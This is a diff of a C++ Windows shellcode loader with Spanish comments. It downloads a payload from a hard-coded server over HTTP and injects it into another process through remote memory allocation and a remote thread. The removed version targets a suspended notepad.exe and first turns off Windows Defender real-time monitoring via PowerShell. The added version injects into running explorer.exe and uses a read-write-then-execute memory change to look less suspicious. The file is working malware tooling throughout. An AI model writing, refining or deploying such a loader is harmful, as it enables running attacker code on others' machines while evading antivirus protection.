@@ -1,40 +1,29 @@
-#include <Windows.h>
+#include <windows.h>
 #include <winhttp.h>
+#include <tlhelp32.h>
 #include <iostream>
 #include <vector>
 
 #pragma comment(lib, "winhttp.lib")
 
-void DisableDefender() {
-    // PowerShell command to disable real-time monitoring in Windows Defender
-    const char* psScript = "powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"";
-
-    // Execute the PowerShell command
-    system(psScript);
-}
-
 // Función para descargar un archivo binario desde un servidor y almacenarlo en un buffer en memoria
-std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
-    // Inicializa la sesión
+std::vector<BYTE> DownloadShellcode(LPCWSTR serverName, LPCWSTR objectName) {
     HINTERNET hSession = WinHttpOpen(L"A WinHTTP Example Program/1.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession) return {};
 
-    // Conexión al servidor
-    HINTERNET hConnect = WinHttpConnect(hSession, baseAddress, INTERNET_DEFAULT_HTTP_PORT, 0);
+    HINTERNET hConnect = WinHttpConnect(hSession, serverName, INTERNET_DEFAULT_HTTP_PORT, 0);
     if (!hConnect) {
         WinHttpCloseHandle(hSession);
         return {};
     }
 
-    // Solicitud HTTP
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", filename, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", objectName, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
     if (!hRequest) {
         WinHttpCloseHandle(hConnect);
         WinHttpCloseHandle(hSession);
         return {};
     }
 
-    // Enviar solicitud
     if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) || !WinHttpReceiveResponse(hRequest, NULL)) {
         WinHttpCloseHandle(hRequest);
         WinHttpCloseHandle(hConnect);
@@ -42,7 +31,6 @@ std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
         return {};
     }
 
-    // Leer los datos
     std::vector<BYTE> buffer;
     DWORD dwSize = 0, dwDownloaded = 0;
     do {
@@ -54,7 +42,6 @@ std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
         }
     } while (dwSize > 0);
 
-    // Cerrar las conexiones
     WinHttpCloseHandle(hRequest);
     WinHttpCloseHandle(hConnect);
     WinHttpCloseHandle(hSession);
@@ -62,69 +49,90 @@ std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
     return buffer;
 }
 
-int main() {
+// Función para obtener el handle de un proceso por nombre
+HANDLE GetProcessHandleByName(const std::wstring& processName) {
+    HANDLE hProcess = nullptr;
+    PROCESSENTRY32W pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32W);
 
-    DisableDefender();
-    // Descarga el shellcode desde el servidor
-    std::vector<BYTE> shellcode = Download(L"192.168.2.138", L"/test.bin");
+    auto snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snapshot == INVALID_HANDLE_VALUE) return nullptr;
+
+    if (Process32FirstW(snapshot, &pe32)) {
+        do {
+            if (processName == pe32.szExeFile) {
+                hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
+                break;
+            }
+        } while (Process32NextW(snapshot, &pe32));
+    }
+
+    CloseHandle(snapshot);
+    return hProcess;
+}
+
+int main(int argc, char* argv[]) {
+    // Descargar shellcode desde el servidor
+    std::wstring serverName = L"192.168.2.138";
+    std::wstring objectName = L"/test.bin";  // Ruta del shellcode
+    std::vector<BYTE> shellcode = DownloadShellcode(serverName.c_str(), objectName.c_str());
+
     if (shellcode.empty()) {
-        std::cerr << "Error al descargar el archivo binario.\n";
+        std::cerr << "Error al descargar el shellcode.\n";
         return 1;
     }
 
-    // Inyección en un proceso nuevo (por ejemplo, notepad.exe)
-    STARTUPINFO si = { sizeof(STARTUPINFO) };
-    PROCESS_INFORMATION pi = { 0 };
+    HANDLE hThread; // Remote thread handle
+    LPVOID my_sc_mem; // Pointer to remote buffer for payload
+    DWORD oldProtect = 0;
 
-    if (!CreateProcess(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
-        std::cerr << "Error al crear el proceso.\n";
-        return 1;
+    std::wstring pName = L"explorer.exe";  // Nombre del proceso en el que inyectar
+    HANDLE hProcess = GetProcessHandleByName(pName);
+
+    if (hProcess) {
+        std::wcout << L"Handle to " << pName << ": " << hProcess << std::endl;
+
+        // Asignar memoria para el shellcode en el proceso remoto con permisos PAGE_READWRITE
+        my_sc_mem = VirtualAllocEx(hProcess, 0, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (!my_sc_mem) {
+            std::cerr << "Error al asignar memoria en el proceso remoto.\n";
+            CloseHandle(hProcess);
+            return 1;
+        }
+
+        // Escribir el shellcode en la memoria del proceso remoto
+        if (!WriteProcessMemory(hProcess, my_sc_mem, shellcode.data(), shellcode.size(), NULL)) {
+            std::cerr << "Error al escribir en la memoria del proceso remoto.\n";
+            VirtualFreeEx(hProcess, my_sc_mem, 0, MEM_RELEASE);
+            CloseHandle(hProcess);
+            return 1;
+        }
+
+        // Cambiar la protección de la memoria a PAGE_EXECUTE_READ para poder ejecutar el shellcode
+        if (!VirtualProtectEx(hProcess, my_sc_mem, shellcode.size(), PAGE_EXECUTE_READ, &oldProtect)) {
+            std::cerr << "Error al cambiar la protección de la memoria.\n";
+            VirtualFreeEx(hProcess, my_sc_mem, 0, MEM_RELEASE);
+            CloseHandle(hProcess);
+            return 1;
+        }
+
+        // Crear un hilo remoto que apunte al shellcode
+        hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)my_sc_mem, NULL, 0, NULL);
+        if (hThread != NULL) {
+            WaitForSingleObject(hThread, 500);
+            CloseHandle(hThread);
+        }
+        else {
+            std::cerr << "Error al crear el hilo remoto.\n";
+        }
+
+        VirtualFreeEx(hProcess, my_sc_mem, 0, MEM_RELEASE);  // Liberar la memoria
+        CloseHandle(hProcess);  // Cerrar el handle al proceso
     }
-
-    // Asignar memoria en el proceso remoto
-    LPVOID pRemoteBuffer = VirtualAllocEx(pi.hProcess, NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (!pRemoteBuffer) {
-        std::cerr << "Error al asignar memoria en el proceso remoto.\n";
-        TerminateProcess(pi.hProcess, 1);
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-        return 1;
+    else {
+        std::cerr << "No se pudo obtener el handle del proceso.\n";
     }
-
-    // Escribir el shellcode en el proceso remoto
-    SIZE_T bytesWritten = 0;
-    if (!WriteProcessMemory(pi.hProcess, pRemoteBuffer, shellcode.data(), shellcode.size(), &bytesWritten)) {
-        std::cerr << "Error al escribir en la memoria del proceso remoto.\n";
-        VirtualFreeEx(pi.hProcess, pRemoteBuffer, 0, MEM_RELEASE);
-        TerminateProcess(pi.hProcess, 1);
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-        return 1;
-    }
-
-    // Crear un hilo remoto que apunte al shellcode
-    HANDLE hRemoteThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, NULL);
-    if (!hRemoteThread) {
-        std::cerr << "Error al crear el hilo remoto.\n";
-        VirtualFreeEx(pi.hProcess, pRemoteBuffer, 0, MEM_RELEASE);
-        TerminateProcess(pi.hProcess, 1);
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-        return 1;
-    }
-
-    // Reanudar el proceso para ejecutar el shellcode
-    ResumeThread(pi.hThread);
-
-    // Esperar a que termine el hilo
-    WaitForSingleObject(hRemoteThread, INFINITE);
-
-    // Limpiar recursos
-    CloseHandle(hRemoteThread);
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
-
-    std::cout << "Inyección completada con éxito.\n";
 
     return 0;
 }
+
